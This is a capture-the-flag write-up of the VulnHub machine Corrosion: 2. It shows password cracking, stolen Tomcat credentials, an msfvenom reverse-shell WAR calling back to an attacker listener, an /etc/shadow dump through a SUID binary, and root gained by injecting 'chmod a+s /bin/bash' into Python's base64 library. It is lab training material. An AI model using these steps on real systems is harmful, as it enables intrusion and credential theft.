# Vulnhub - Corrosion: 2 

Colddbox: 2 is a boot-to-root vulnerable machine rated medium by the machine creator. It is available to download from [VulnHub](https://www.vulnhub.com/entry/corrosion-2,745/).

The machine's `ip` can be found using `netdiscover` or `nmap` can be used to assist in locating the machine's `ip`, as shown below as this machine's `ip` is not shown on the login screen.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -sP 192.168.1.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 10:06 EST
Nmap scan report for corrosion.lan (192.168.1.96)
Host is up (0.00085s latency).
...
Nmap done: 256 IP addresses (1 hosts up) scanned in 3.61 seconds
```

## Recon

As usual, we will begin with an `nmap` scan to discover open ports on the host.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -p- -A -oN corrosion2.nmap 192.168.1.96
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 10:08 EST
Nmap scan report for corrosion.lan (192.168.1.96)
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-title: Apache Tomcat/9.0.53
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:E3:90:DF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms corrosion.lan (192.168.1.96)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds
```

Looking at the output, ports `22`, `80`, and `8080` are open. The host appears to be an `Ubuntu` system running `Apache 2.4.41` on `80` and `Apache Tomcat 9.0.53` on `8080`. Let's start a `gobuster` scan on `80` to see if there are any hidden directories. Additionally, we will also perform checks for `php`, `html`, and `txt` files that might be hosted.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.1.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.96
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/22 10:11:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/12/22 10:13:14 Finished
===============================================================
```

Nothing much found on port `80`. Let's try `8080` instead.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.1.96:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.96:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/22 10:15:21 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/readme.txt           (Status: 200) [Size: 153]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww.html (Status: 400) [Size: 804]
/http%3A%2F%2Fwww.txt (Status: 400) [Size: 804]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/http%3A%2F%2Fwww.php (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.php (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.html (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube.txt (Status: 400) [Size: 804]
Progress: 261888 / 882244 (29.68%)
...
```

Rather quickly, we recieve a few hits that we can look into while the scan finishes. Let's check out `readme.txt`.

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.1.96:8080/readme.txt
Hey randy! It's your System Administrator. I left you a file on the server, I'm sure nobody will find it.
Also remember to use that password I gave you.
```

Interesting. It looks like there might be a file we can try to enumerate for. We can run another `gobuster` scan, but this time we can change our extentions to include some extra filetypes.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.1.96:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,gz,gzip,tar
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.96:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              zip,gz,gzip,tar
[+] Timeout:                 10s
===============================================================
2021/12/22 10:19:27 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/backup.zip           (Status: 200) [Size: 33723]
/manager              (Status: 302) [Size: 0] [--> /manager/]
...
```

Looks like we might have found something interesting. Let's grab `backup.zip` and see what's inside.

```bash
┌──(kali㉿kali)-[~]
└─$ wget http://192.168.1.96:8080/backup.zip
--2021-12-22 10:20:33--  http://192.168.1.96:8080/backup.zip
Connecting to 192.168.1.96:8080... connected.
HTTP request sent, awaiting response... 200
Length: 33723 (33K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                         100%[==============================================================>]  32.93K  --.-KB/s    in 0s

2021-12-22 10:20:33 (359 MB/s) - ‘backup.zip’ saved [33723/33723]


┌──(kali㉿kali)-[~]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] catalina.policy password:
password incorrect--reenter:
   skipping: catalina.policy         incorrect password
   skipping: context.xml             incorrect password
   skipping: catalina.properties     incorrect password
   skipping: jaspic-providers.xml    incorrect password
   skipping: jaspic-providers.xsd    incorrect password
   skipping: logging.properties      incorrect password
   skipping: server.xml              incorrect password
   skipping: tomcat-users.xml        incorrect password
   skipping: tomcat-users.xsd        incorrect password
   skipping: web.xml                 incorrect password
```

It appears that we could grab `backup.zip`, however, it is password protected. Using `zip2john` and `john`, we can try to recover the password.

```bash
┌──(kali㉿kali)-[~]
└─$ zip2john backup.zip > backup.zip.hash
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali)-[~]
└─$ john backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@administrator_hi5 (backup.zip)
1g 0:00:00:02 DONE (2021-12-22 10:22) 0.4032g/s 4632Kp/s 4632Kc/s 4632KC/s @lexutz..@201187
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now that we recovered the password, we can now extract the archive.

```bash
┌──(kali㉿kali)-[~]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] catalina.policy password:
  inflating: catalina.policy
  inflating: context.xml
  inflating: catalina.properties
  inflating: jaspic-providers.xml
  inflating: jaspic-providers.xsd
  inflating: logging.properties
  inflating: server.xml
  inflating: tomcat-users.xml
  inflating: tomcat-users.xsd
  inflating: web.xml
  ```
  
Now we can examine `tomcat-users.xml` to try to enumerate `tomcat` credentials.
  
```bash
┌──(kali㉿kali)-[~]
└─$ cat tomcat-users.xml | grep username
  you must define such a user - the username and password are arbitrary.
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
  <user username="manager" password="melehifokivai" roles="manager-gui"/>
  <user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
```

Awesome! Now we can log into `tomcat`. From here, we can try to upload a shell to gain a foothold.

## User Flag

Using `msfvenom`, we can create a reverse-shell payload to upload to `tomcat`.

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p java/shell_reverse_tcp LPORT=9001 LHOST=192.168.1.181 -f war -o shell.war
Payload size: 13321 bytes
Final size of war file: 13321 bytes
Saved as: shell.war
```

And after setting up our listener and uploading the payload, we have our reverse shell!

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.181] from (UNKNOWN) [192.168.1.96] 39438
whoami
tomcat
```

Success! Using `python` and some `stty raw -echo` magic, we can upgrade our shell to a full `tty`.

```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@corrosion:/var/spool/cron$ ^Z
[1]+  Stopped                 nc -lvnp 9001

┌──(kali㉿kali)-[~]
└─$ stty raw -echo

┌──(kali㉿kali)-[~]
nc -lvnp 9001

tomcat@corrosion:/var/spool/cron$
```

With some simple enumeration, we can find two users on the machine, `jaye` and `randy`, and can grab `user.txt`.

```bash
tomcat@corrosion:/var/spool/cron$ ls /home
jaye  randy
tomcat@corrosion:/var/spool/cron$ ls /home/jaye
ls: cannot open directory '/home/jaye': Permission denied
tomcat@corrosion:/var/spool/cron$ ls /home/randy
Desktop    Downloads  note.txt  Public           Templates  Videos
Documents  Music      Pictures  randombase64.py  user.txt
tomcat@corrosion:/var/spool/cron$ cat /home/randy/user.txt
ca73a018ae6908a7d0ea5d1c269ba4b6
```

## Root Flag

Let's start by trying to `su` to another user by using the password we recovered for `tomcat`

```bash
tomcat@corrosion:/var/spool/cron$ su jaye
Password:
$ whoami
jaye
```

Trying it for `jaye`, it was successful. Do we have any `sudo` priveleges?

```bash
tomcat@corrosion:/var/spool/cron$ su jaye
Password:
$ whoami
jaye
```

Unfortunetly, no. How about `SUID` binaries?

```
$ find / -perm /4000 2> /dev/null
...
/home/jaye/Files/look
...
```

It appears we do have an unusual binary with `SUID`. Using `look`, we can read any file on the system as `root`. Let's try to grab `/etc/shadow` and pass the hasses to `john`.

```bash
$ /home/jaye/Files/look '' "/etc/shadow"
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
systemd-coredump:!!:18886::::::
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
sshd:*:18887:0:99999:7:::
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```

It takes awhile using a VM, but `john` was able to recover `randy`'s password.

```bash
┌──(kali㉿kali)-[~]
└─$ john corrosion2.hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
07051986randy    (randy)
1g 0:00:00:00 DONE (2021-12-22 11:09) 20.00g/s 20.00p/s 20.00c/s 20.00C/s 07051986randy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can `su` to `randy` and enumerate some more.

```bash
$ su randy
Password:
randy@corrosion:/var/spool/cron$
```

Let's begin by checking our `sudo` priveleges.

```bash
randy@corrosion:/var/spool/cron$ sudo -l
[sudo] password for randy:
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

It looks like there is a `python` script we can execute as `root`. Let's see what our permissions are on the file itself.

```bash
randy@corrosion:/var/spool/cron$ ls -l /home/randy/randombase64.py
-rwxr-xr-x 1 root root 210 Sep 20 19:48 /home/randy/randombase64.py
```

It looks like we can only read the file, so let's check it out.

```bash
randy@corrosion:/var/spool/cron$ cat /home/randy/randombase64.py
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```

It doesn't look to be that exciting. Perhaps we can try to hijack the `base64` library? Let's find it and check our permissions.

```bash
randy@corrosion:/var/spool/cron$ find / -name base64.py 2> /dev/null
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/core18/2253/usr/lib/python3.6/base64.py
/snap/core20/1270/usr/lib/python3.8/base64.py
/snap/gnome-3-34-1804/77/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/77/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
randy@corrosion:/var/spool/cron$ ls -la /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20386 Sep 20 20:03 /usr/lib/python3.8/base64.py
```

It would appear we can write to `base64.py`! Let's try adding a piece of code that will turn `/bin/bash` into a `SUID` binary.

```bash
randy@corrosion:/var/spool/cron$ head -n15 /usr/lib/python3.8/base64.py
#! /usr/bin/python3.8

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""

# Modified 04-Oct-1995 by Jack Jansen to use binascii module
# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

import re
import struct
import binascii
import os

os.system("chmod a+s /bin/bash")
...
```

Now let's run the `randombase64.py` script with `sudo` to see our results.

```bash
randy@corrosion:/var/spool/cron$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
[sudo] password for randy:
Enter your string:

randy@corrosion:/var/spool/cron$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

It looks like we have `SUID` set on `/bin/bash`. Let's try executing it to see if we get `root`.

```bash
randy@corrosion:/var/spool/cron$ /bin/bash -p
bash-5.0# uname -a; id; cat /root/root.txt
Linux corrosion 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=1000(randy) gid=1000(randy) euid=0(root) egid=0(root) groups=0(root),27(sudo),1000(randy)
2fdbf8d4f894292361d6c72c8e833a4b
```

We were able to escalate to `root` and grab `root.txt` successfully :)



